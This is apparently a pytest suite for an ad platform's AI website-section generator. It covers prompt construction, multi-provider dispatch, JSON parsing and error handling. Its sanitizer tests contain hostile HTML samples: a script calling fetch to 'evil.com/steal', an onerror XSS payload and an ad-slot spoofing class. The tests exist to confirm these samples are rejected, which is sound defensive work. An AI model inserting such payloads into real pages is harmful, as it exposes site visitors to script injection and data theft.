"""
Tests for Open Design Phase 4A: Backend AI Provider Client & Craft Prompt Engine.

Verifies:
- Prompt compilation and brand theme token injection.
- Craft guidance rules (anti-ai-slop, typography, color, accessibility).
- Multi-provider dispatch for Gemini, Groq, and OpenAI with mocked HTTP responses.
- Structured JSON response parsing and markdown fence stripping.
- Malformed JSON, non-object JSON, and missing keys handling.
- Authoritative Schema v2 HTML sanitization, script injection rejection, and ad slot anti-spoofing.
- Controlled exception handling (timeouts, 429, 5xx, network errors, missing API keys).
- In-memory generation with zero database persistence.
"""

import json
from unittest.mock import AsyncMock, patch

import httpx
import pytest

from liteads.ad_server.services.website_ai_service import (
    SECTION_JSON_SCHEMA,
    GeneratedSectionResult,
    WebsiteAICraftEngine,
    WebsiteAIConfigError,
    WebsiteAIMalformedResponseError,
    WebsiteAISecurityError,
    WebsiteAIService,
    WebsiteAIUnavailableError,
)
from liteads.schemas.website import (
    BlockItem,
    BlockType,
    OpenDesignSectionContent,
    ThemeConfig,
)


# ── Fixtures ─────────────────────────────────────────────────────────────────

@pytest.fixture
def custom_theme() -> ThemeConfig:
    return ThemeConfig(
        primary_color="#3b82f6",
        secondary_color="#64748b",
        background_color="#f8fafc",
        text_color="#0f172a",
        font_family="Inter",
        border_radius="0.75rem",
    )


@pytest.fixture
def sample_valid_section_dict() -> dict:
    return {
        "section_tag": "section",
        "section_id": "pricing-matrix",
        "css_classes": "pricing-grid-custom",
        "styles": {
            "background-color": "var(--bg)",
            "padding": "4rem 2rem",
            "gap": "1.5rem",
        },
        "html_content": (
            '<div class="pricing-card">'
            "<h3>Growth Plan</h3>"
            '<p class="price">$49/month</p>'
            '<p class="desc">Engineered for high-volume advertising campaigns.</p>'
            '<a href="https://example.com/signup" class="cta-link">Get Started</a>'
            "</div>"
        ),
    }


# ── 1. Craft Prompt Compilation Tests ────────────────────────────────────────

def test_craft_prompt_compilation_injects_theme_tokens(custom_theme: ThemeConfig):
    """Verify that build_system_prompt binds the authorized theme tokens into CSS variables."""
    prompt = WebsiteAICraftEngine.build_system_prompt(custom_theme)

    assert custom_theme.primary_color in prompt
    assert custom_theme.secondary_color in prompt
    assert custom_theme.background_color in prompt
    assert custom_theme.text_color in prompt
    assert custom_theme.border_radius in prompt
    assert custom_theme.font_family in prompt

    assert "var(--primary)" in prompt
    assert "var(--secondary)" in prompt
    assert "var(--bg)" in prompt
    assert "var(--text)" in prompt
    assert "var(--radius)" in prompt
    assert "var(--font-family, sans-serif)" in prompt


def test_craft_prompt_compilation_incorporates_all_four_craft_rules(custom_theme: ThemeConfig):
    """Verify system prompt contains Anti-AI-slop, Typography, Color, and Accessibility rules."""
    prompt = WebsiteAICraftEngine.build_system_prompt(custom_theme)

    # 1. Anti-AI-slop
    assert "NO DEFAULT INDIGO" in prompt
    assert "#6366f1" in prompt
    assert "NO CLICHÉ GRADIENTS" in prompt
    assert "NO EMOJIS AS ICONS" in prompt
    assert "NO FILLER COPY" in prompt
    assert "80/20 RULE" in prompt

    # 2. Typography
    assert "TYPOGRAPHY SCALE" in prompt
    assert "line-height" in prompt

    # 3. Color & Accent discipline
    assert "COLOR & ACCENT DISCIPLINE" in prompt
    assert "4.5:1" in prompt

    # 4. Accessibility
    assert "ACCESSIBILITY BASELINE" in prompt
    assert "semantic HTML5" in prompt
    assert "`alt` attribute" in prompt

    # 5. Security boundaries
    assert "FORBIDDEN TAGS" in prompt
    assert "<script>" in prompt
    assert "FORBIDDEN ATTRIBUTES" in prompt
    assert "onclick" in prompt
    assert "block-ad-placement" in prompt


def test_user_prompt_builder_structure():
    """Verify build_user_prompt compiles section type, prompt, and optional page context."""
    user_prompt = WebsiteAICraftEngine.build_user_prompt(
        prompt="A 3-column features grid highlighting sub-millisecond bidding",
        section_type="features",
        context={
            "page_title": "Home",
            "project_name": "AdTech Cloud",
            "existing_sections": ["hero", "pricing"],
        },
    )

    assert "features" in user_prompt
    assert "sub-millisecond bidding" in user_prompt
    assert "Page Title: Home" in user_prompt
    assert "Website Name: AdTech Cloud" in user_prompt
    assert "hero, pricing" in user_prompt


# ── 2. Multi-Provider Dispatch Tests (Mocked HTTP) ───────────────────────────

@pytest.mark.asyncio
async def test_dispatch_gemini_provider(custom_theme: ThemeConfig, sample_valid_section_dict: dict):
    """Verify dispatch to Google Gemini generateContent endpoint."""
    mock_response = httpx.Response(
        status_code=200,
        json={
            "candidates": [
                {
                    "content": {
                        "parts": [{"text": json.dumps(sample_valid_section_dict)}]
                    }
                }
            ]
        },
        request=httpx.Request("POST", "https://test.com"),
    )

    mock_client = AsyncMock(spec=httpx.AsyncClient)
    mock_client.post = AsyncMock(return_value=mock_response)

    with patch("liteads.ad_server.services.website_ai_service.get_settings") as mock_settings:
        mock_settings.return_value.llm_provider = "gemini"
        mock_settings.return_value.gemini.api_key = "test-gemini-key"
        mock_settings.return_value.gemini.model = "gemini-2.5-flash"

        service = WebsiteAIService(client=mock_client, provider="gemini")
        result = await service.generate_section(
            prompt="Build a pricing matrix",
            section_type="pricing",
            theme_config=custom_theme,
        )

        assert isinstance(result, GeneratedSectionResult)
        assert result.provider == "gemini"
        assert result.section_id == "pricing-matrix"
        assert result.block.type == BlockType.OPEN_DESIGN_SECTION
        assert result.block.id.startswith("blk_ai_")

        # Verify endpoint and parameters
        mock_client.post.assert_awaited_once()
        call_args = mock_client.post.await_args
        assert "models/gemini-2.5-flash:generateContent" in call_args[0][0]
        assert call_args[1]["params"]["key"] == "test-gemini-key"
        assert call_args[1]["json"]["generationConfig"]["responseMimeType"] == "application/json"


@pytest.mark.asyncio
async def test_dispatch_groq_provider(custom_theme: ThemeConfig, sample_valid_section_dict: dict):
    """Verify dispatch to Groq chat completions endpoint with json_object format."""
    mock_response = httpx.Response(
        status_code=200,
        json={
            "choices": [
                {
                    "message": {
                        "content": json.dumps(sample_valid_section_dict)
                    }
                }
            ]
        },
        request=httpx.Request("POST", "https://test.com"),
    )

    mock_client = AsyncMock(spec=httpx.AsyncClient)
    mock_client.post = AsyncMock(return_value=mock_response)

    with patch("liteads.ad_server.services.website_ai_service.get_settings") as mock_settings:
        mock_settings.return_value.llm_provider = "groq"
        mock_settings.return_value.groq.api_key = "test-groq-key"
        mock_settings.return_value.groq.model = "llama-3.3-70b-versatile"

        service = WebsiteAIService(client=mock_client, provider="groq")
        result = await service.generate_section(
            prompt="Build a features section",
            section_type="features",
            theme_config=custom_theme,
        )

        assert result.provider == "groq"
        assert result.section_id == "pricing-matrix"

        call_args = mock_client.post.await_args
        assert call_args[0][0] == "https://api.groq.com/openai/v1/chat/completions"
        assert call_args[1]["headers"]["Authorization"] == "Bearer test-groq-key"
        assert call_args[1]["json"]["response_format"] == {"type": "json_object"}


@pytest.mark.asyncio
async def test_dispatch_openai_provider(custom_theme: ThemeConfig, sample_valid_section_dict: dict):
    """Verify dispatch to OpenAI chat completions endpoint with strict JSON schema."""
    mock_response = httpx.Response(
        status_code=200,
        json={
            "choices": [
                {
                    "message": {
                        "content": json.dumps(sample_valid_section_dict)
                    }
                }
            ]
        },
        request=httpx.Request("POST", "https://test.com"),
    )

    mock_client = AsyncMock(spec=httpx.AsyncClient)
    mock_client.post = AsyncMock(return_value=mock_response)

    with patch("liteads.ad_server.services.website_ai_service.get_settings") as mock_settings:
        mock_settings.return_value.llm_provider = "openai"
        mock_settings.return_value.openai.api_key = "test-openai-key"

        service = WebsiteAIService(client=mock_client, provider="openai")
        result = await service.generate_section(
            prompt="Build a testimonials section",
            section_type="testimonials",
            theme_config=custom_theme,
        )

        assert result.provider == "openai"
        call_args = mock_client.post.await_args
        assert call_args[0][0] == "https://api.openai.com/v1/chat/completions"
        assert call_args[1]["headers"]["Authorization"] == "Bearer test-openai-key"
        assert call_args[1]["json"]["response_format"]["type"] == "json_schema"
        assert call_args[1]["json"]["response_format"]["json_schema"]["schema"] == SECTION_JSON_SCHEMA


# ── 3. Structured Response Parsing & Markdown Code Fence Stripping ───────────

@pytest.mark.asyncio
async def test_markdown_code_fence_unwrapping(custom_theme: ThemeConfig, sample_valid_section_dict: dict):
    """Verify that models wrapping JSON in ```json ... ``` are cleanly unwrapped."""
    fenced_output = f"```json\n{json.dumps(sample_valid_section_dict, indent=2)}\n```"

    mock_response = httpx.Response(
        status_code=200,
        json={"choices": [{"message": {"content": fenced_output}}]},
        request=httpx.Request("POST", "https://test.com"),
    )

    mock_client = AsyncMock(spec=httpx.AsyncClient)
    mock_client.post = AsyncMock(return_value=mock_response)

    with patch("liteads.ad_server.services.website_ai_service.get_settings") as mock_settings:
        mock_settings.return_value.llm_provider = "groq"
        mock_settings.return_value.groq.api_key = "test-key"

        service = WebsiteAIService(client=mock_client, provider="groq")
        result = await service.generate_section(prompt="Fenced JSON", theme_config=custom_theme)

        assert result.section_id == "pricing-matrix"
        assert "pricing-card" in result.section_content.html_content


# ── 4. Malformed JSON & Unexpected Structure Rejections ──────────────────────

@pytest.mark.asyncio
async def test_rejects_non_json_response(custom_theme: ThemeConfig):
    """Verify that raw plain text from an LLM raises WebsiteAIMalformedResponseError."""
    mock_response = httpx.Response(
        status_code=200,
        json={"choices": [{"message": {"content": "Here is your section: <div>Hello</div>"}}]},
        request=httpx.Request("POST", "https://test.com"),
    )
    mock_client = AsyncMock(spec=httpx.AsyncClient)
    mock_client.post = AsyncMock(return_value=mock_response)

    with patch("liteads.ad_server.services.website_ai_service.get_settings") as mock_settings:
        mock_settings.return_value.llm_provider = "groq"
        mock_settings.return_value.groq.api_key = "test-key"

        service = WebsiteAIService(client=mock_client, provider="groq")
        with pytest.raises(WebsiteAIMalformedResponseError) as exc_info:
            await service.generate_section(prompt="Create section", theme_config=custom_theme)

        assert "invalid JSON" in str(exc_info.value)


@pytest.mark.asyncio
async def test_rejects_json_list_instead_of_object(custom_theme: ThemeConfig):
    """Verify that a JSON array raises WebsiteAIMalformedResponseError."""
    mock_response = httpx.Response(
        status_code=200,
        json={"choices": [{"message": {"content": json.dumps([{"item": 1}])}}]},
        request=httpx.Request("POST", "https://test.com"),
    )
    mock_client = AsyncMock(spec=httpx.AsyncClient)
    mock_client.post = AsyncMock(return_value=mock_response)

    with patch("liteads.ad_server.services.website_ai_service.get_settings") as mock_settings:
        mock_settings.return_value.llm_provider = "groq"
        mock_settings.return_value.groq.api_key = "test-key"

        service = WebsiteAIService(client=mock_client, provider="groq")
        with pytest.raises(WebsiteAIMalformedResponseError) as exc_info:
            await service.generate_section(prompt="Create section", theme_config=custom_theme)

        assert "must be a JSON object" in str(exc_info.value)


@pytest.mark.asyncio
async def test_rejects_missing_required_keys(custom_theme: ThemeConfig):
    """Verify that responses missing mandatory keys raise WebsiteAIMalformedResponseError."""
    incomplete = {
        "section_tag": "section",
        # missing section_id, css_classes, styles, html_content
    }
    mock_response = httpx.Response(
        status_code=200,
        json={"choices": [{"message": {"content": json.dumps(incomplete)}}]},
        request=httpx.Request("POST", "https://test.com"),
    )
    mock_client = AsyncMock(spec=httpx.AsyncClient)
    mock_client.post = AsyncMock(return_value=mock_response)

    with patch("liteads.ad_server.services.website_ai_service.get_settings") as mock_settings:
        mock_settings.return_value.llm_provider = "groq"
        mock_settings.return_value.groq.api_key = "test-key"

        service = WebsiteAIService(client=mock_client, provider="groq")
        with pytest.raises(WebsiteAIMalformedResponseError) as exc_info:
            await service.generate_section(prompt="Create section", theme_config=custom_theme)

        assert "Missing required key" in str(exc_info.value)


# ── 5. Malicious HTML & Ad Slot Spoofing (Sanitizer Enforcement) ─────────────

@pytest.mark.asyncio
async def test_rejects_executable_script_in_html_content(custom_theme: ThemeConfig, sample_valid_section_dict: dict):
    """Verify that <script> tags generated by an LLM raise WebsiteAISecurityError."""
    malicious = dict(sample_valid_section_dict)
    malicious["html_content"] = '<div class="content"><script>fetch("https://evil.com/steal")</script></div>'

    mock_response = httpx.Response(
        status_code=200,
        json={"choices": [{"message": {"content": json.dumps(malicious)}}]},
        request=httpx.Request("POST", "https://test.com"),
    )
    mock_client = AsyncMock(spec=httpx.AsyncClient)
    mock_client.post = AsyncMock(return_value=mock_response)

    with patch("liteads.ad_server.services.website_ai_service.get_settings") as mock_settings:
        mock_settings.return_value.llm_provider = "groq"
        mock_settings.return_value.groq.api_key = "test-key"

        service = WebsiteAIService(client=mock_client, provider="groq")
        with pytest.raises(WebsiteAISecurityError) as exc_info:
            await service.generate_section(prompt="Malicious prompt", theme_config=custom_theme)

        assert "failed security policy validation" in str(exc_info.value)


@pytest.mark.asyncio
async def test_rejects_inline_event_handlers_in_html_content(custom_theme: ThemeConfig, sample_valid_section_dict: dict):
    """Verify that inline event handlers (e.g. onerror, onclick) raise WebsiteAISecurityError."""
    malicious = dict(sample_valid_section_dict)
    malicious["html_content"] = '<div class="content"><img src="invalid.jpg" onerror="alert(1)" alt="fail" /></div>'

    mock_response = httpx.Response(
        status_code=200,
        json={"choices": [{"message": {"content": json.dumps(malicious)}}]},
        request=httpx.Request("POST", "https://test.com"),
    )
    mock_client = AsyncMock(spec=httpx.AsyncClient)
    mock_client.post = AsyncMock(return_value=mock_response)

    with patch("liteads.ad_server.services.website_ai_service.get_settings") as mock_settings:
        mock_settings.return_value.llm_provider = "groq"
        mock_settings.return_value.groq.api_key = "test-key"

        service = WebsiteAIService(client=mock_client, provider="groq")
        with pytest.raises(WebsiteAISecurityError) as exc_info:
            await service.generate_section(prompt="Event handler prompt", theme_config=custom_theme)

        assert "failed security policy validation" in str(exc_info.value)


@pytest.mark.asyncio
async def test_rejects_ad_slot_impersonation_in_html_content(custom_theme: ThemeConfig, sample_valid_section_dict: dict):
    """Verify that class or ID tokens spoofing Rivinity ad slots raise WebsiteAISecurityError."""
    malicious = dict(sample_valid_section_dict)
    malicious["html_content"] = '<div class="block-ad-placement"><p>Fake ad placement</p></div>'

    mock_response = httpx.Response(
        status_code=200,
        json={"choices": [{"message": {"content": json.dumps(malicious)}}]},
        request=httpx.Request("POST", "https://test.com"),
    )
    mock_client = AsyncMock(spec=httpx.AsyncClient)
    mock_client.post = AsyncMock(return_value=mock_response)

    with patch("liteads.ad_server.services.website_ai_service.get_settings") as mock_settings:
        mock_settings.return_value.llm_provider = "groq"
        mock_settings.return_value.groq.api_key = "test-key"

        service = WebsiteAIService(client=mock_client, provider="groq")
        with pytest.raises(WebsiteAISecurityError) as exc_info:
            await service.generate_section(prompt="Spoof ad slot", theme_config=custom_theme)

        assert "failed security policy validation" in str(exc_info.value)


# ── 6. Error Handling (Timeouts, 429, 5xx, Network & Config Errors) ──────────

@pytest.mark.asyncio
async def test_handles_provider_timeout():
    """Verify httpx.TimeoutException maps to WebsiteAIUnavailableError without leaking internals."""
    mock_client = AsyncMock(spec=httpx.AsyncClient)
    mock_client.post = AsyncMock(side_effect=httpx.TimeoutException("Connection timed out"))

    with patch("liteads.ad_server.services.website_ai_service.get_settings") as mock_settings:
        mock_settings.return_value.llm_provider = "groq"
        mock_settings.return_value.groq.api_key = "test-key"

        service = WebsiteAIService(client=mock_client, provider="groq")
        with pytest.raises(WebsiteAIUnavailableError) as exc_info:
            await service.generate_section(prompt="Timeout test")

        assert "timed out" in str(exc_info.value).lower()
        # Verify no sensitive URL or API keys in exception message
        assert "test-key" not in str(exc_info.value)


@pytest.mark.asyncio
async def test_handles_provider_rate_limit_429():
    """Verify 429 Too Many Requests maps to WebsiteAIUnavailableError."""
    mock_response = httpx.Response(status_code=429, request=httpx.Request("POST", "https://test.com"))
    mock_client = AsyncMock(spec=httpx.AsyncClient)
    mock_client.post = AsyncMock(side_effect=httpx.HTTPStatusError("Rate limited", request=mock_response.request, response=mock_response))

    with patch("liteads.ad_server.services.website_ai_service.get_settings") as mock_settings:
        mock_settings.return_value.llm_provider = "groq"
        mock_settings.return_value.groq.api_key = "test-key"

        service = WebsiteAIService(client=mock_client, provider="groq")
        with pytest.raises(WebsiteAIUnavailableError) as exc_info:
            await service.generate_section(prompt="Rate limit test")

        assert "rate limit" in str(exc_info.value).lower()


@pytest.mark.asyncio
async def test_handles_provider_server_error_500():
    """Verify 500 internal server error maps to controlled WebsiteAIUnavailableError."""
    mock_response = httpx.Response(status_code=500, request=httpx.Request("POST", "https://test.com"))
    mock_client = AsyncMock(spec=httpx.AsyncClient)
    mock_client.post = AsyncMock(side_effect=httpx.HTTPStatusError("Server error", request=mock_response.request, response=mock_response))

    with patch("liteads.ad_server.services.website_ai_service.get_settings") as mock_settings:
        mock_settings.return_value.llm_provider = "groq"
        mock_settings.return_value.groq.api_key = "test-key"

        service = WebsiteAIService(client=mock_client, provider="groq")
        with pytest.raises(WebsiteAIUnavailableError) as exc_info:
            await service.generate_section(prompt="500 test")

        assert "temporarily unavailable" in str(exc_info.value).lower()


@pytest.mark.asyncio
async def test_missing_api_key_raises_config_error():
    """Verify unconfigured API key raises WebsiteAIConfigError immediately before any HTTP dispatch."""
    with patch("liteads.ad_server.services.website_ai_service.get_settings") as mock_settings:
        mock_settings.return_value.llm_provider = "openai"
        mock_settings.return_value.openai.api_key = ""

        service = WebsiteAIService(provider="openai")
        with pytest.raises(WebsiteAIConfigError) as exc_info:
            await service.generate_section(prompt="No key test")

        assert "not configured with a valid API key" in str(exc_info.value)


def test_unsupported_provider_raises_config_error():
    """Verify unknown provider choice raises WebsiteAIConfigError on initialization."""
    with patch("liteads.ad_server.services.website_ai_service.get_settings") as mock_settings:
        mock_settings.return_value.llm_provider = "anthropic_unsupported"

        with pytest.raises(WebsiteAIConfigError) as exc_info:
            WebsiteAIService(provider="anthropic_unsupported")

        assert "Unsupported AI provider" in str(exc_info.value)


def test_empty_or_oversized_prompt_raises_value_error():
    """Verify input validation rejects empty or oversized prompts."""
    with patch("liteads.ad_server.services.website_ai_service.get_settings") as mock_settings:
        mock_settings.return_value.llm_provider = "groq"
        mock_settings.return_value.groq.api_key = "test-key"

        service = WebsiteAIService(provider="groq")

        # Empty prompt
        with pytest.raises(ValueError, match="Prompt must not be empty"):
            import asyncio
            asyncio.run(service.generate_section(prompt="   "))

        # Oversized prompt (>2000 chars)
        with pytest.raises(ValueError, match="exceeds maximum allowed length"):
            import asyncio
            asyncio.run(service.generate_section(prompt="a" * 2001))


# ── 7. Confirmation of Zero Database Persistence ────────────────────────────

@pytest.mark.asyncio
async def test_zero_database_persistence(custom_theme: ThemeConfig, sample_valid_section_dict: dict):
    """
    Verify that WebsiteAIService is completely stateless:
    - It returns a pure in-memory BlockItem and GeneratedSectionResult.
    - No database queries, sessions, or persistence operations are invoked.
    """
    mock_response = httpx.Response(
        status_code=200,
        json={"choices": [{"message": {"content": json.dumps(sample_valid_section_dict)}}]},
        request=httpx.Request("POST", "https://test.com"),
    )
    mock_client = AsyncMock(spec=httpx.AsyncClient)
    mock_client.post = AsyncMock(return_value=mock_response)

    with patch("liteads.ad_server.services.website_ai_service.get_settings") as mock_settings:
        mock_settings.return_value.llm_provider = "groq"
        mock_settings.return_value.groq.api_key = "test-key"

        service = WebsiteAIService(client=mock_client, provider="groq")
        result = await service.generate_section(
            prompt="Stateless generation",
            theme_config=custom_theme,
        )

        assert isinstance(result.block, BlockItem)
        assert result.block.type == BlockType.OPEN_DESIGN_SECTION
        assert result.block.content["html_content"] is not None

        # Verify that the block is a detached, transient Pydantic model
        assert hasattr(result.block, "model_dump")
        assert not hasattr(result.block, "_sa_instance_state")
